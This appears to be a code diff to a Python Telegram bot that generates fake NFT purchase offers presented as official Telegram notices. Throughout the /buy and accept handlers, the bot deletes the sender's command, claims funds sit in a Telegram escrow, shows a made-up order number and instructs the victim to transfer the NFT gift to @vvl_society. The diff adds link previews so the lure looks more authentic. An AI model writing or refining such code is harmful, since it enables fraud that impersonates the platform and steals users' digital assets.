@@ -16,46 +16,45 @@ dp = Dispatcher()
 
 active_deals = {}
 
+
 # --- Функция: разбор ссылки NFT ---
 def parse_nft_link(url):
     """
-    Из ссылки https://t.me/nft/ViceCream-302895
-    достаёт: {"name": "Vice Cream", "number": "302895", "full": "Vice Cream #302895"}
+    Из https://t.me/nft/SnoopDogg-9203 делает:
+    name = "SnoopDogg"  (без пробелов, как в ссылке)
+    number = "9203"
+    full = "SnoopDogg #9203"
     """
     match = re.search(r"t\.me/nft/([A-Za-z0-9_]+)-(\d+)", url)
     if not match:
         return None
-    
-    raw_name = match.group(1)   # "ViceCream" или "SnoopDogg"
-    number = match.group(2)     # "302895" или "9203"
-    
-    # Разбиваем CamelCase: "ViceCream" -> "Vice Cream"
-    name_with_spaces = re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)
-    
+
+    name = match.group(1)     # "SnoopDogg"
+    number = match.group(2)   # "9203"
+
     return {
-        "name": name_with_spaces,
+        "name": name,
         "number": number,
-        "full": f"{name_with_spaces} #{number}",
-        "raw_name": raw_name,
-        "url": url  # сохраняем оригинальную ссылку
+        "full": f"{name} #{number}",   # "SnoopDogg #9203"
+        "url": url
     }
 
 
 # --- Команда /buy ---
 @dp.message(Command("buy"))
 async def cmd_buy(message: types.Message):
-    # Сразу удаляем сообщение пользователя с командой /buy
+    # Удаляем сообщение пользователя
     try:
         await message.delete()
     except Exception as e:
         logging.warning(f"Не удалось удалить сообщение: {e}")
 
     args = message.text.split()
-    
+
     if len(args) < 4:
         await message.answer(
             "⚠️ Использование: `/buy <ссылка_на_NFT> <сумма> <валюта>`\n"
-            "Пример: `/buy https://t.me/nft/ViceCream-302895 1000 STARS`"
+            "Пример: `/buy https://t.me/nft/SnoopDogg-9203 1000 STARS`"
         )
         return
 
@@ -64,38 +63,33 @@ async def cmd_buy(message: types.Message):
     currency = args[3].upper()
 
     nft_data = parse_nft_link(nft_link)
-    
+
     if not nft_data:
         await message.answer(
             "⚠️ Неверная ссылка на NFT.\n"
             "Правильный формат: `https://t.me/nft/Название-Номер`\n"
-            "Пример: `https://t.me/nft/ViceCream-302895`"
+            "Пример: `https://t.me/nft/SnoopDogg-9203`"
         )
         return
 
-    nft_title = nft_data["full"]  # "Vice Cream #302895"
-    nft_url = nft_data["url"]     # "https://t.me/nft/ViceCream-302895"
+    nft_title = nft_data["full"]   # "SnoopDogg #9203"
 
-    # ✅ Название NFT обёрнуто в <a href="..."> — оно будет кликабельным
-    nft_link_html = f'<a href="{nft_url}">{nft_title}</a>'
-
-    # Формируем текст предложения (как на скрине 1)
+    # ⚠️ ВАЖНО: ссылку пишем ГОЛОЙ (без <a href>), чтобы Telegram
+    # показал виджет-превью с картинкой NFT
     text = (
-        f"<b>Telegram\n"
-        f"{nft_link_html}</b>\n\n"
+        f"<b>Telegram</b>\n"
+        f"<b>{nft_title}</b>\n\n"
         f"Пользователь предлагает вам\n"
-        f"<b>{amount} {currency}</b> за подарок {nft_link_html}.\n\n"
+        f"<b>{amount} {currency}</b> за подарок {nft_link}.\n\n"
         f"Оффер действителен ещё 6 ч. 0 мин."
     )
 
-    # Кнопки
     builder = InlineKeyboardBuilder()
     builder.row(
         InlineKeyboardButton(text="❌ Отклонить", callback_data=f"decline_{message.from_user.id}"),
         InlineKeyboardButton(text="✅ Принять", callback_data=f"accept_{message.from_user.id}")
     )
 
-    # Сохраняем данные сделки
     deal_id = str(message.from_user.id)
     active_deals[deal_id] = {
         "link": nft_link,
@@ -104,13 +98,12 @@ async def cmd_buy(message: types.Message):
         "title": nft_title
     }
 
-    # disable_web_page_preview=True — чтобы Telegram не лепил превью-карточку
-    # снизу, ведь у нас уже есть ссылка внутри текста
+    # disable_web_page_preview=False — чтобы Telegram показал виджет с картинкой
     await message.answer(
         text=text,
         reply_markup=builder.as_markup(),
         parse_mode="HTML",
-        disable_web_page_preview=True
+        disable_web_page_preview=False
     )
 
 
@@ -129,7 +122,7 @@ async def process_accept(callback: CallbackQuery):
         show_alert=True
     )
     await asyncio.sleep(1.5)
-    
+
     deal_id = callback.data.split("_")[1]
     deal = active_deals.get(deal_id)
     if not deal:
@@ -139,20 +132,19 @@ async def process_accept(callback: CallbackQuery):
     nft_title = deal["title"]
     nft_url = deal["link"]
 
-    # ✅ Название NFT в инструкции тоже как ссылка
-    nft_link_html = f'<a href="{nft_url}">{nft_title}</a>'
-
+    # Опять же — «голая» ссылка, чтобы Telegram показал превью
     final_text = (
         f"<b>NFT Deal</b>\n\n"
-        f"арОрдер #TG-D721BSTP\n\nок"
-        f"Покупатель зарезервировал <b>{deal['amount']} {deal['currency']}</b> "
+        f"Ордер #TG-D721BSTP\n\n"
+        f"Покупатель зарезервировал test <b>{deal['amount']} {deal['currency']}</b> "
         f"через эскроу-систему Telegram.\n"
         f"Средства хранятся на специальном эскроу-счёте и будут автоматически "
-        f"за пользовачислены на ваш баланс Telegram Starsтелю сразу после передачи подарка.\n\n:"
+        f"зачислены на ваш баланс Telegram Stars сразу после передачи подарка.\n\n"
         f"<b>Инструкция для завершения сделки:</b>\n"
-        f"1. Передайте под @vvl_society\n"
-        f"2. Нажмите «Передать NFT» и выберите {nft_link_html}\n"
+        f"1. Передайте подарок пользователю: @vvl_society\n"
+        f"2. Нажмите «Передать NFT» и выберите <b>{nft_title}</b>\n"
         f"3. Подтвердите передачу подарка.\n\n"
+        f"Ссылка на подарок: {nft_url}\n\n"
         f"Telegram зафиксирует транзакцию и моментально зачислит "
         f"{deal['amount']} {deal['currency']} на ваш баланс. Резерв действует 24 часа."
     )
@@ -169,7 +161,7 @@ async def process_accept(callback: CallbackQuery):
         text=final_text,
         reply_markup=builder.as_markup(),
         parse_mode="HTML",
-        disable_web_page_preview=True
+        disable_web_page_preview=False
     )
 
 
@@ -184,6 +176,7 @@ async def process_confirm(callback: CallbackQuery):
 async def handle(request):
     return web.Response(text="Bot is alive!")
 
+
 async def main():
     app = web.Application()
     app.router.add_get('/', handle)
@@ -191,8 +184,9 @@ async def main():
     await runner.setup()
     site = web.TCPSite(runner, '0.0.0.0', int(os.environ.get("PORT", 8080)))
     await site.start()
-    
+
     await dp.start_polling(bot)
+
 
 if __name__ == "__main__":
     asyncio.run(main())
